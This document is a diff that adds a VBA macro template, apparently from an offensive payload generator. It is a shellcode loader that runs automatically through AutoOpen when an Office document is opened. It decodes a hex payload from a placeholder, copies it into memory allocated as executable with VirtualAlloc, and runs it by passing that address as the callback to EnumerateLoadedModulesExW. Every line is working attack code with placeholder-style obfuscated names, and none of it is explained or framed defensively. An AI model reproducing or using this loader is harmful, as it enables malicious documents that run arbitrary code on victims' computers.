@@ -1,0 +1,49 @@
+Private Declare PtrSafe Function virtualAlloc Lib "kernel32" Alias "VirtualAlloc" (ByVal lpaddress As Long, _
+    ByVal dwSize As Long, _
+    ByVal flAllocationType As Long, _
+    ByVal flProtect As Long) As LongLong
+
+Private Declare PtrSafe Sub rtlMoveMemory Lib "kernel32" Alias "RtlMoveMemory" (ByVal pDst As LongLong, _
+    ByVal pSrc As LongLong, _
+    ByVal plen As Integer)
+
+Private Declare PtrSafe Function enumLoadedModules Lib "dbghelp" Alias "EnumerateLoadedModulesExW" (ByVal hProcess As Any, _
+    ByVal EnumLoadedModulesCallback As Any, _
+    ByVal UserContext As Integer) As Boolean
+
+Private Declare PtrSafe Function getProcessHandle Lib "kernel32" Alias "GetCurrentProcess" () As LongLong
+
+Sub AutoOpen()
+
+Const aVAR6a = &H1000
+Const aVAR7a = &H40
+
+Dim sc As String
+Dim aVAR1a As Long
+Dim aVAR2a() As Byte
+Dim aVAR3a As LongLong
+Dim aVAR4a As LongLong
+
+aPAYLOADa
+
+aVAR1a = Len(sc) / 2
+ReDim aVAR2a(0 To aVAR1a)
+
+For aVAR8a = 0 To aVAR1a - 1
+    If aVAR8a = 0 Then
+        pos = aVAR8a + 1
+    Else
+        pos = aVAR8a * 2 + 1
+    End If
+    Value = Mid(sc, pos, 2)
+    aVAR2a(aVAR8a) = Val("&H" & Value)
+Next
+
+aVAR3a = virtualAlloc(0, aVAR1a, aVAR6a, aVAR7a)
+
+rtlMoveMemory aVAR3a, VarPtr(aVAR2a(0)), UBound(aVAR2a)
+
+aVAR4a = getProcessHandle()
+aVAR5a = enumLoadedModules(aVAR4a, aVAR3a, 0)
+
+End Sub
